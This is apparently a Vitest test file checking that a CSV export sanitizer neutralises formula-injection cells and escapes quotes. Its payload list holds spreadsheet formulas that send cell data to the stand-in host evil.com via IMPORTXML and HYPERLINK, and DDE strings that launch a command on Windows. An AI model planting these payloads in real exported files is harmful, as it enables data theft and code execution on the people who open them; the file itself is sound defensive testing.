import { describe, it, expect } from 'vitest'
import { sanitizeCsvCell } from '@/app/api/export/route'

// ---------------------------------------------------------------------------
// CSV Injection resistance tests (Fase 5)
//
// Spreadsheet applications (Excel, LibreOffice, Google Sheets) execute cell
// values starting with =, +, -, @ as formulas. Attackers can use this to:
// - Exfiltrate data via HYPERLINK() or IMPORTXML()
// - Execute DDE commands on Windows (older Excel versions)
// - Social engineer the CSV consumer
// ---------------------------------------------------------------------------

const CSV_INJECTION_PAYLOADS = [
  '=HYPERLINK("http://evil.com","Click here")',
  '=IMPORTXML(CONCAT("http://evil.com/?x=",CONCATENATE(A2:E2)),"")',
  '+cmd|"/C calc"!A0',
  '-2+3+cmd|"/C calc"!A0',
  '@SUM(1+1)*cmd|"/C calc"!A0',
  '=1+1',
  '=NOW()',
  '=CONCATENATE(A1,B1)',
  '+CONCATENATE(A1,B1)',
  '-CONCATENATE(A1,B1)',
  '@CONCATENATE(A1,B1)',
  '=SUM(A1:A100)',
  '=VLOOKUP(A1,B:C,2,FALSE)',
]

describe('CSV Injection — sanitizeCsvCell', () => {
  for (const payload of CSV_INJECTION_PAYLOADS) {
    it(`sanitizes injection payload: "${payload.slice(0, 50)}"`, () => {
      const result = sanitizeCsvCell(payload)
      // Must NOT start with a formula character
      expect(result).not.toMatch(/^[=+\-@]/)
      // Should start with a tab (breaking the formula)
      expect(result).toMatch(/^\t/)
    })
  }

  it('preserves legitimate data unchanged (no unnecessary escaping)', () => {
    const legitValues = [
      'João Silva',
      'Acme Corp',
      'CTO',
      'São Paulo',
      'SP',
      'Tecnologia',
      '2024-01-15T10:00:00.000Z',
      'Normal company name with spaces',
      'Contact with (parentheses)',
    ]
    for (const value of legitValues) {
      expect(sanitizeCsvCell(value)).toBe(value)
    }
  })

  it('escapes double quotes per RFC 4180', () => {
    expect(sanitizeCsvCell('He said "hello"')).toBe('He said ""hello""')
    expect(sanitizeCsvCell('"quoted"')).toBe('""quoted""')
  })

  it('does not allow formula execution even after tab prefix', () => {
    // The tab character must come before the formula character
    const result = sanitizeCsvCell('=HYPERLINK("http://evil.com")')
    expect(result.startsWith('\t=')).toBe(true)
    expect(result.startsWith('=')).toBe(false)
  })
})
